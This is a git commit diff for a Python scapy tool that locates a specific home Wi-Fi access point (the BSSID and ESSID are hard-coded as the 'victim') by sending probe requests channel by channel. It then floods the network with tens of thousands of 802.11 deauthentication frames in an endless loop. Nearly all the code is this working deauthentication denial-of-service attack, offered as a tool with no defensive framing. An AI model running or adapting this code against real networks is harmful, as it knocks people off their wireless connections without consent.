5e987a0fc0343e3b6d145e96be0e56ab4b2d0b1e
sefyan0hack <sefyanhack@gmail.com>
2024-02-03 20:58:13 +0100

    now my too full

--- Class.py
+++ Class.py
@@ -1,4 +1,4 @@
-from scapy.all import RadioTap,Dot11,Dot11Deauth
+from scapy.all import RadioTap,Dot11,Dot11Deauth,Dot11Elt,Dot11EltRates,Dot11EltRates,Dot11EltHTCapabilities
 class WiFi:
     __id     : int = 1
     essid   : str = 'name'
@@ -45,3 +45,94 @@ class Packet:
         deauth = Dot11Deauth(reason=7)
         packet = radiotap / dot11 / deauth
         return packet
+    
+    def ProbeReq(wifi :WiFi):
+        # RadioTap layer
+        radiotap = RadioTap(
+            version=0,
+            pad=0,
+            Rate=1.0,  # Mbps
+            notdecoded="\\xc6\x00"
+        )
+
+        # 802.11-FCS layer
+        dot11_fcs = Dot11(
+            subtype=0x04,  # Probe Request
+            type=0,        # Management
+            proto=0,
+            FCfield="",
+            ID=0,
+            addr1=wifi.bssid,
+            addr2="18:a6:f7:0d:40:6b",
+            addr3=wifi.bssid,
+            SC=61872,
+        )
+        dot11_probe_req = Dot11Elt(
+            ID="SSID",
+            len=len(wifi.essid),
+            info=wifi.essid.encode()
+        )
+        rates_ie = Dot11EltRates(
+            ID="Supported Rates",
+            len=8,
+            rates=[1, 2, 5, 11, 6, 9, 12, 18]
+        )
+        extended_rates_ie = Dot11EltRates(
+            ID="Extended Supported Rates",
+            len=4,
+            rates=[24, 36, 48, 54]
+        )
+        ht_capabilities_ie = Dot11EltHTCapabilities(
+            ID="HT Capabilities",
+            len=26,
+            L_SIG_TXOP_Protection=0,
+            Forty_Mhz_Intolerant=0,
+            PSMP=0,
+            DSSS_CCK=1,
+            Max_A_MSDU=3839,
+            Delayed_BlockAck=0,
+            Rx_STBC=1,
+            Tx_STBC=1,
+            Short_GI_40Mhz=1,
+            Short_GI_20Mhz=1,
+            Green_Field=0,
+            SM_Power_Save="disabled",
+            Supported_Channel_Width="20Mhz+40Mhz",
+            LDPC_Coding_Capability=1,
+            Min_MPDCU_Start_Spacing=5,
+            Max_A_MPDU_Length_Exponent=3,
+            TX_Unequal_Modulation=0,
+            TX_Max_Spatial_Streams=0,
+            TX_RX_MCS_Set_Not_Equal=0,
+            TX_MCS_Set_Defined=1,
+            RX_Highest_Supported_Data_Rate=300,
+            RX_MSC_Bitmask=65535,
+            RD_Responder=0,
+            HTC_HT_Support=0,
+            MCS_Feedback=0,
+            PCO_Transition_Time=0,
+            PCO=0,
+            Channel_Estimation_Capability=0,
+            CSI_max_n_Rows_Beamformer_Supported=0,
+            Compressed_Steering_n_Beamformer_Antennas_Supported=0,
+            Noncompressed_Steering_n_Beamformer_Antennas_Supported=0,
+            CSI_n_Beamformer_Antennas_Supported=0,
+            Minimal_Grouping=0,
+            Explicit_Compressed_Beamforming_Feedback=0,
+            Explicit_Noncompressed_Beamforming_Feedback=0,
+            Explicit_Transmit_Beamforming_CSI_Feedback=0,
+            Explicit_Compressed_Steering=0,
+            Explicit_Noncompressed_Steering=0,
+            Explicit_CSI_Transmit_Beamforming=0,
+            Calibration=0,
+            Implicit_Trasmit_Beamforming=0,
+            Transmit_NDP=0,
+            Receive_NDP=0,
+            Transmit_Staggered_Sounding=0,
+            Receive_Staggered_Sounding=0,
+            Implicit_Transmit_Beamforming_Receiving=0,
+            ASEL=""
+        )
+        probe_request_packet = radiotap / dot11_fcs / dot11_probe_req / rates_ie / extended_rates_ie / ht_capabilities_ie
+        return probe_request_packet
+    
--- main.py
+++ main.py
@@ -1,38 +1,49 @@
+'''
+                     GENERAL PUBLIC LICENSE
+                     Version 4, 3 Feb 2024
+
+ Copyright (C) 2024 Free Everyone is permitted to copy and distribute
+ verbatim copies of this license document, but changing it is not allowed.
+
+this tool ws made by sofyane bentaleb for fun 
+facebook: https://web.facebook.com/sefyan.yalis
+isntagram : https://www.instagram.com/s.f.n_term
+github : https://github.com/sefyan0hack
+linkedin " https://www.linkedin.com/in/kritos-yt-090a22273/
+
+'''
+
 import Class
 import time,os
-from scapy.all import sniff,Dot11Beacon, Dot11FCS, Dot11EltDSSSet, Dot11, sendp
+from scapy.all import sniff, Dot11EltDSSSet, Dot11, sendp,srp1
 
 victim = Class.WiFi
+# the victim bssid
 victim.bssid = "b0:0a:d5:40:cf:3e"
+# the victim essid
+victim.essid = "inwi Home 4G 40CF3E"
+# you're card in monitor mode
 card = "wlan1mon"
+# time of dos attack befor recheck the channel again 
 _T = 60 # second
 
-#get the fuck channel and filter th scapy for beacons and addr2 = victim bssdi
-
-def channel(pkt):
-    if os.system("sudo bash channel_hopping.sh > /dev/null&") !=0 :
-        print(" [+] run as root ")
-    _channel = -1
-    for p in pkt:
-        if p.haslayer(Dot11EltDSSSet):
-            if p.getlayer(Dot11FCS).addr2 == victim.bssid.lower():
-                os.system("sudo killall bash > /dev/null&")
-                _channel = p.getlayer(Dot11EltDSSSet).channel
-                break
+def channel():
+    _channel =-1
+    for i in range(1,13):
+        os.system(f'iwconfig wlan1mon channel {i}')
+        rep = srp1(Class.Packet.ProbeReq(victim),iface=card,verbose=False,retry=0,timeout=1)
+        if rep != None:
+            _channel = rep[Dot11EltDSSSet].channel
+            break
     return _channel
 
 def main():
-    try:
-        while(1):
-            pakets = sniff(count=13,iface = card,lfilter=lambda x: Dot11 in x and x[Dot11].subtype == 0x08)
-            victim.channel = channel(pakets)
-            while(victim.channel != -1):
-                print(f'attacking victim {victim.bssid} at channel {victim.channel}')
-                sendp(Class.Packet.deauth(victim),count=_T*1000,iface=card, verbose=False)
-                break
-
-    except KeyboardInterrupt:
-        os.system("sudo killall bash > /dev/null&")
-
+    while(1):
+        victim.channel = channel()
+        os.system(f'iwconfig wlan1mon channel {victim.channel}')
+        while(victim.channel != -1):
+            print(f'attacking victim {victim.essid} at channel {victim.channel}')
+            sendp(Class.Packet.deauth(victim),count=_T*1000,iface=card, verbose=False)
+            break
 if __name__ == "__main__":
     main()
